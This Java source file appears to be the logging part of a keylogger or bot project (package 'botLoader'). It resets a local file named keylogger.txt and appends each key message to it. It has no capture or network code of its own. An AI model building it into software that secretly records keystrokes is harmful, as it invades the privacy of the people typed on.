package botLoader;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;

/**
 * botLoader.KeyOut helps with outputting the current key being pressed
 */
public class KeyOut {
    public KeyOut() {
        try {
            //So we want to start off fresh with a new file every time we start
            new FileWriter("keylogger.txt");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    synchronized public void outputToFile(String message) {
        try {
            //Then we create a new writer, but this time with the append flag
            Writer output = new BufferedWriter(new FileWriter("keylogger.txt", true));
            output.append(message + "\n");
            output.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
